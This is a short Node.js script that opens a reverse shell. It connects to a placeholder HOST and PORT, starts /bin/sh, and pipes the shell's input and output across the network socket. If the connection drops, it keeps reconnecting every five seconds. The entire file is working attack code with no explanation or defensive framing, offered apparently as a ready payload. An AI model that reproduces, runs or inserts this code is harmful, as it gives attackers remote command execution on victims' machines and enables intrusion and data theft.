var host = 'HOST';
var port = PORT;

var net = require('net');
var spawn = require('child_process').spawn;

TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

console.log('def ...')
global.c = function(host,port) {
    var client = new net.Socket();
    client.connect(port, host, function() {
        console.log('callback ...')
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
        client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(function() { global.c(host,port); }, TIMEOUT);
    });
}
global.c(host,port);
console.log('Started reverse shell process!');